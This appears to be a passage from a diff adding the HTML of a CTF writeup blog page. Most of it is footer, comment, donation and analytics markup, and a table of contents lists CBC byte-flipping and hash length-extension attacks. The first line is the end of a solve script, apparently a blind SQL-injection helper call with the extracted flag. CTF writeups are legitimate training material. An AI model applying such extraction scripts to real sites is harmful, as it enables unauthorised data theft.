class="comment">#len = get_length(payload) #19</span></span><br><span class="line">flag = get_content(<span class="string">'fL$4G'</span>,<span class="string">'fiag'</span>,<span class="string">"0"</span>,<span class="number">19</span>,<span class="string">'0'</span>,<span class="number">0</span>) <span class="comment">#flag&#123;haha~you win!&#125;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div id="donation_div"></div>
+
+<script src="/js/vdonate.js"></script>
+<script>
+var a = new Donate({
+  title: '我 可爱 打钱', // 可选参数，打赏标题
+  btnText: 'Donate', // 可选参数，打赏按钮文字
+  el: document.getElementById('donation_div'),
+  wechatImage: 'http://t1.aixinxi.net/o_1c7bjknhco0c17af10n6ml016l5a.jpg-j.jpg',
+  alipayImage: 'http://t1.aixinxi.net/o_1c7bjgpua1knr1ncl18f9g18c5ba.jpg-j.jpg'
+});
+</script>
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/07/2018-ZJGSCTF-writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2018 ZJGSCTF writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/04/26/Do-you-know-Google-hacking/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Do you know Google hacking?</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#简单的登录题"><span class="nav-number">1.</span> <span class="nav-text">简单的登录题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#iv"><span class="nav-number">1.1.</span> <span class="nav-text">iv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cipher"><span class="nav-number">1.2.</span> <span class="nav-text">cipher</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CBC字节翻转攻击"><span class="nav-number">1.3.</span> <span class="nav-text">CBC字节翻转攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#让我进去"><span class="nav-number">2.</span> <span class="nav-text">让我进去</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#md5加密原理"><span class="nav-number">2.1.</span> <span class="nav-text">md5加密原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hash长度扩展攻击"><span class="nav-number">2.2.</span> <span class="nav-text">hash长度扩展攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#认真一点！"><span class="nav-number">3.</span> <span class="nav-text">认真一点！</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2017 - 2018 AssassinQ All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/links" class="mobile-nav-link">Links</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            AssassinQ
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 qianfei11 All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/love.js"></script>
+</body>
+</html>
